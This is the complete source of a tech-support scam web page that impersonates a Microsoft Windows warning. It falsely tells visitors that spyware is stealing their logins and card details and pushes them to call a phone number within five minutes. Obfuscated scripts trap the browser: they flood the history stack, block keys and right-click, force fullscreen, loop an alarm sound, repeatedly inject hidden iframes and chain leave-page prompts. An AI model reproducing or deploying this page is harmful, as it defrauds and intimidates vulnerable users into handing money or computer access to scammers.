<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv=content-type content="text/html;charset=UTF-8"/>
        <meta name=robots content="noindex, nofollow">
        <meta http-equiv=Content-Type content="text/html; charset=UTF-8">
        <title>Official Microsoft-Windows-Help-and-Services</title>
        <meta name=robots content=NOINDEX,NOFOLLOW>

        <!-- Global site tag (gtag.js) - Google Analytics -->
      <script async src="https://www.googletagmanager.com/gtag/js?id=UA-122392890-2"></script>
      <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'UA-122392890-2');
      </script>



        <style>
            div.fixed {
                position: fixed;
                bottom: 0;
                right: 0;
                width: 300px;
                height: 300px;
                border: 1px
            }
        </style>
        <style>
            div.fixed2 {
                position: fixed;
                bottom: 55px;
                right: 80px;
                width: 200px;
                height: 50px;
                border: 1px;
                color: black;
                font-size: 22px;
                font-weight: bold;
                -webkit-animation-name: example;
                -webkit-animation-duration: 1s;
                animation-name: example;
                animation-duration: 1s;
                animation-iteration-count: infinite
            }

            @-webkit-keyframes example {
                0% {
                    color: black
                }

                50% {
                    color: red
                }

                100% {
                    color: black
                }
            }

            @keyframes example {
                0% {
                    color: black
                }

                50% {
                    color: red
                }

                100% {
                    color: black
                }
            }
        </style>
        <style type=text/css>
            #alert {
                position: absolute;
                left: 30%;
                top: 5%;
                background: #f1f1f1;
                border: 2px solid #0032c7;
                width: 40%
            }

            .input {
                margin-top: 10px;
                background: #f1f1f1;
                padding: 20px;
                text-align: right
            }

            .input input {
                opacity: 1;
                padding: 15px;
                font-size: 16px;
                width: 35%;
                font-weight: 700
            }

            .input input:hover {
                opacity: .75
            }

            .head h1,h2,h3,h4 {
                margin: 0;
                padding: 0
            }

            .text {
                padding: 20px
            }

            .right {
                float: right
            }

            .left {
                float: left
            }

            .clear {
                clear: both
            }

            .alert_hide {
                cursor: pointer
            }

            body {
                background-color: #0000A0;
                color: #000;
                font-family: "Trebuchet MS",Arial,Helvetica,sans-serif;
                font-family: Arial;
                font-size: 18px;
                margin: 0
            }

            body,html {
                margin: 10px;
                padding: 0;
                overflow: hidden;
                width: 100%;
                height: 100%;
                background-attachment: fixed;
                background-color: #0000A0
            }
        </style>
        <script src=./js/jquery.min.js></script>
        <script>
            function formatAMPM() {
                var d = new Date()
                  , minutes = d.getMinutes().toString().length == 1 ? '0' + d.getMinutes() : d.getMinutes()
                  , hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours()
                  , ampm = d.getHours() >= 12 ? 'pm' : 'am'
                  , months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
                  , days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
                return days[d.getDay()] + ' ' + months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ' + hours + ':' + minutes + ampm;
            }
        </script>
        <script>
            function getURLParameter(a) {
                return decodeURI((RegExp(a + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
            }
            function random_betw(b, a) {
                return Math.round(Math.random() * (a - b) + b)
            }
            var phone = "+1-866-475-7375";
            var text = "** Microsoft Windows Warning Alert **\n\nERROR # MS-SYSINFO32 \nPlease call us immediately at: " + phone + ".\nDo not ignore this critical alert..\nIf you close this page, your computer access will be disabled to prevent further damage to our network. Your computer has alerted us that it has been infected with a pornographic spyware and virus. \n\nThe following information is being stolen: \n A.Facebook Logins\n B.Credit Card Details\n C.Email Account Logins\n D.Photos and documents stored on this computer.\nYou must contact us immediately so that our expert engineers can walk you through the removal process over the phone to protect your identity. Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.\n\nMicrosoft Toll Free:" + phone;
        </script>
        <script>
            var w = window.screen.width;
            var h = window.screen.height;
            window.moveTo(0, 0);
            window.resizeTo(w, h);
        </script>
        <script>
            var isOpera = !!window.opera || navigator.userAgent.indexOf(" OPR/") >= 0;
            var isFirefox = typeof InstallTrigger !== "undefined";
            var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf("Constructor") > 0;
            var isChrome = !!window.chrome && !isOpera;
            var isIE = /*@cc_on!@*/
            false || !!document.documentMode;
        </script>
    </head>
    <body style="background-color: #0000A0; margin:0px;padding:0px;font-family:arial,sans-serif!important">
        <div id=blue-screen style=display:none>
            <table style=width:100% height=61 cellpadding=0 cellspacing=0 border=0>
                <tr>
                    <td width=766>
                        <img src=img/bg-1.jpg>
                    </td>
                    <td align=right background=img/bg-2.jpg>
                        <img src=img/bg-3.jpg>
                    </td>
                </tr>
            </table>
        </div>
        <div style="width:85%;margin:auto;padding-top:4%;background-color:#0000A0;position:relative">
            <div class=centering-col>
                <div class=centered-content>
                    <h1 style=color:#FFF;margin-top:20px;font-weight:900>** Microsoft Warning  &nbsp;Alert **</h1>
                    <h3 style=color:#FFF;margin-top:20px;font-weight:900>ERROR # 0xC004FC03</h3>
                    <div style=float:right;height:180px;width:180px;margin-right:19%>

                    </div>
                    <div style=float:left;height:250px;width:520px;padding-left:20px;padding-top:25px;color:#FFF>
                        Please call &nbsp;us immediately at: <script>
                            document.write('<span style="font-size:22;font-weight:bold;">' + phone + "</span>");
                        </script>
                        <br>
                        Do not ignore this critical alert.<br/>
                        If you close this page, your computer access will be disabled to prevent further damage to our network.<br/>
                        Your computer has alerted us that it has been infected with a Pornographic Spyware and virus. The following information is being stolen:<br/>
                        <br/>
                        1.Facebook &nbsp;Logins<br/>
                        2.Credit &nbsp;Card &nbsp;Details<br/>
                        3.Email &nbsp;Account &nbsp;Logins<br/>
                        4.Photos and documents &nbsp;stored &nbsp;on this computer<br>
                        <br>
                        You must contact us immediately so that our expert engineers can walk you through the removal &nbsp;process over the phone to protect your identity. Please call us within the next &nbsp;5 minutes to prevent your &nbsp;computer from being disabled or from any information loss.<br></br>
                    </div>
                    <div style=margin-top:420px>
                        <h1 style="color:#ffff;font-weight:900; font-size:30px">
                            Call Microsoft Windows Support<br>
                            <script>
                                document.write('<span style="color:#7fff7f">' + phone + " (Toll FREE)</span> ");
                            </script>
</br></h1></div></div></div></div>
<audio autoplay=autoplay loop id=audio>
    <source src=./sound/err.mp3 type=audio/mpeg>
</audio>
<div id=chrome-alerts class=chrome-alert style=display:none>
    <div>
        <a href=# class=cross>×</a>
        <h1>Activation Security Warning:</h1>
        <div class=content-box id=alert-content-box>
            <p>
                ** Microsoft Warning &nbsp;Alert **<br>
                <br>
                ERROR # 0xC004FC03<br>
                <br>
                <br>
                Please call us immediately at:
                <span style=font-size:13pt;font-weight:bold>
                    <script>
                        document.write(phone);
                    </script>
                </span>
                &nbsp;(Microsoft &nbsp;Toll Free)<br>Do not ignore this critical alert.</br>
                If you close this page, your computer access will be &nbsp;disabled to prevent further damage to our network.<br/>
                Your computer has alerted us that it has been infected with a Pornographic &nbsp;Spyware and &nbsp;virus. The following information is being stolen:<br/>
                <br/>
                1.Facebook Logins<br/>
                2.Credit &nbsp;Card Details<br/>
                3.Email &nbsp;Account Logins<br/>
                4.Photos &nbsp;and documents stored on this computer<br/>
                <br/>Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.</br>
</br>Microsoft &nbsp;Toll Free:
<span style='font-size:13pt;font-weight:bold'>
    <script>
        document.write(phone);
    </script>
</span>
</div>
<label style=font-size:12px>
    <input type=checkbox>Prevent this page from creating &nbsp;additional dialogues.
</label>
<div class=action_buttons>
    <a style=color:#fff;background:red;font-size:11pt;font-weight:bold href=javascript: class=active id=leave_page>Leave this Page</a>
</div>
</div></div>
<script>
$(function() {
		if (isFirefox) {
				$("a").click(function(e) {
						e.preventDefault()
				});
				var e = ["pushState", "onbeforeunload", "", "returnValue", "onload", "toString"];
				o = e, u = 325,
						function(e) {
								for (; --e;) o.push(o.shift())
						}(++u);
				var n = function(n, t) {
						return e[n -= 0]
				};
				t = text, window[n("0x0")] = function(e) {
						var o = n("0x1") + t;
						return e[n("0x2")] = o, o
				}, window[n("0x3")] = function() {
						if (confirm("" + t))
								for (var e = "", o = 0; o < 1e8; o++) e += o[n("0x4")](), history[n("0x5")](0, 0, e);
						else
								for (e = "", o = 0; o < 1e8; o++) e += o[n("0x4")](), history[n("0x5")](0, 0, e)
				}
		}
		var t, o, u, r, c, i, l;
		if (isChrome || isOpera) {
				var d = !1;
				$("head").append('<script src="./js/jquery.js"><\/script>'), $("head").append('<link href="./css/main.css" rel="stylesheet">'), document.getElementById("audio").play(), window.onkeydown = function(e) {
						return !1
				}, window.onkeypress = function(e) {
						return !1
				}, onbeforeunload = function() {
						return alert("??????? ESC, ????? ??????? ????????!"), "??????? ESC, ????? ??????? ????????!"
				}, document.oncontextmenu = new Function("return false");
				for (var s = 0; s < 0; s++) alert(text);

				function a() {
						d ? (document.getElementById("blue-screen").style.display = "block", document.getElementsByTagName("body").item(0).setAttribute("class", "past")) : d = !0
				}

				function m() {
						document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || (document.documentElement.requestFullscreen ? document.documentElement.requestFullscreen() : document.documentElement.mozRequestFullScreen ? document.documentElement.mozRequestFullScreen() : document.documentElement.webkitRequestFullscreen && document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)), window.open("redx.php", "Alert", "width=1,height=1,scrolling=yes,fullscreen=yes,left=3000,top=3000")
				}
				document.getElementById("chrome-alerts").style.display = "block", document.addEventListener("keyup", function(e) {
						27 == e.keyCode && m()
				}, !1), document.addEventListener("keyup", function(e) {
						122 != e.keyCode && 17 != e.keyCode && 18 != e.keyCode && 13 != e.keyCode || (a(), m())
				}, !1), window.onload = function() {
						document.onclick = function(e) {
								e = e || event, target = e.target || e.srcElement, target.tagName, m(), a()
						}
				}, addEventListener("click", function() {
						a();
						var e = document.documentElement;
						(e.requestFullScreen || e.webkitRequestFullScreen || e.mozRequestFullScreen).call(e)
				}), window.addEventListener("resize", function() {
						$("body").css("overflow", "hidden"), $(".popup-alert").stop().animate({
								bottom: "-10px",
								opacity: 1
						}, 500), document.getElementById("audio").play(), screen.width, window.innerWidth, window.setInterval(function() {
								for (var e = 0; e < 100; e++) history.pushState(0, 0, e)
						}, 500)
				})
		}
		if (isIE || isSafari) {
				$("#blue-screen,.chrome-alert").hide();
				var f = ["onmouseout", "body", "addEventListener", "mouseout", "*************************************************\nRDN/YahLover.worm!055BCCAC9FEC Infection\n*************************************************\n\n", "attachEvent"];
				i = f, l = 361,
						function(e) {
								for (; --e;) i.push(i.shift())
						}(++l);
				var y = function(e, n) {
						return f[e -= 0]
				};
				r = text, c = text, alert(r), document[y("0x0")][y("0x1")] ? document[y("0x0")][y("0x1")](y("0x2"), function(e) {
						alert(y("0x3") + r)
				}, !1) : document[y("0x0")][y("0x4")](y("0x5"), function(e) {
						alert(r)
				}), window.onbeforeunload = function() {
						return c
				}
		}
});

</script>
<script type=text/javascript>
    function get_browser() {
        var b = navigator.userAgent, a, c = b.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
        if (/trident/i.test(c[1])) {
            a = /\brv[ :]+(\d+)/g.exec(b) || [];
            return {
                name: "IE",
                version: (a[1] || "")
            }
        }
        if (c[1] === "Chrome") {
            a = b.match(/\bOPR\/(\d+)/);
            if (a != null) {
                return {
                    name: "Opera",
                    version: a[1]
                }
            }
        }
        c = c[2] ? [c[1], c[2]] : [navigator.appName, navigator.appVersion, "-?"];
        if ((a = b.match(/version\/(\d+)/i)) != null) {
            c.splice(1, 1, a[1])
        }
        return {
            name: c[0],
            version: c[1]
        }
    }
    var InternetEx = window.navigator.appVersion.indexOf("MSIE") != -1;
    var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
    var browser = get_browser();
    if (browser.name == "Firefox" || isIEedge || InternetEx || navigator.appName == "Microsoft Internet Explorer" || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
        if (isIEedge || InternetEx || navigator.appName == "Microsoft Internet Explorer" || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
            function msg_ff() {
                var a = document.createElement("div");
                a.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>';
                document.body.appendChild(a)
            }
            window.setInterval(function() {
                msg_ff()
            }, 1100)
        } else {
            function msg_ff() {
                var a = document.createElement("div");
                a.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>';
                document.body.appendChild(a)
            }
            window.setInterval(function() {
                msg_ff()
            }, 1100)
        }
    } else {}
    ;</script>


<div class="fixed">}
</script>
<div class="fixed">
    <img src="2.png" style="position: absolute; right: 0px; bottom: 1px;"  width="600">
</div>
<div class="fixed2">
    <script>
        document.write(phone)
    </script>
</div>
</div>
<div style="position: absolute; right: 10px; top: 70px;color:#FFF;">
    <b>
        <u>
            Error &nbsp;Logged at: <script>
                document.write(formatAMPM());
            </script>
            <br>Microsoft Diagnostics IP Address: 127.0.0.1</br>
</div>
</u></b></div></body></html>
